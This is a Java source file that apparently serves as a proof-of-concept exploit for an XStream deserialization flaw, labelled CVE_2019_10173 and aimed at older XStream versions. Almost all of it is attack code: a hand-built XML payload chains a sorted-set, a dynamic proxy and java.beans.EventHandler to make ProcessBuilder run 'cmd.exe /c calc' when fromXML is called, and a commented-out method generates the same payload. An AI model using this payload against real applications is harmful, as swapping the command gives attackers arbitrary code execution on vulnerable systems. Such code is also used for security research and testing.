package com.r17a.xstream.cve.sortedset;

import com.thoughtworks.xstream.XStream;

import java.io.IOException;

//XStream <=1.4.6和1.4.10

public class CVE_2019_10173 {
//    public static String expGen(){
//        XStream xstream = new XStream();
//        Set<Comparable> set = new TreeSet<Comparable>();
//        set.add("foo");
//        set.add(EventHandler.create(Comparable.class, new ProcessBuilder("calc"), "start"));
//        String payload = xstream.toXML(set);
//        System.out.println(payload);
//        return payload;
//    }
    public static void main(String[] args) throws IOException {
//        expGen();
        XStream xStream = new XStream();
        String payload = "<sorted-set>\n" +
                "    <string>foo</string>\n" +
                "    <dynamic-proxy>\n" +
                "    <interface>java.lang.Comparable</interface>\n" +
                "        <handler class=\"java.beans.EventHandler\">\n" +
                "            <target class=\"java.lang.ProcessBuilder\">\n" +
                "                <command>\n" +
                "                    <string>cmd.exe</string>\n" +
                "                    <string>/c</string>\n" +
                "                    <string>calc</string>\n" +
                "                </command>\n" +
                "            </target>\n" +
                "     <action>start</action>"+
                "        </handler>\n" +
                "    </dynamic-proxy>\n" +
                "</sorted-set>\n";
        xStream.fromXML(payload);
    }
}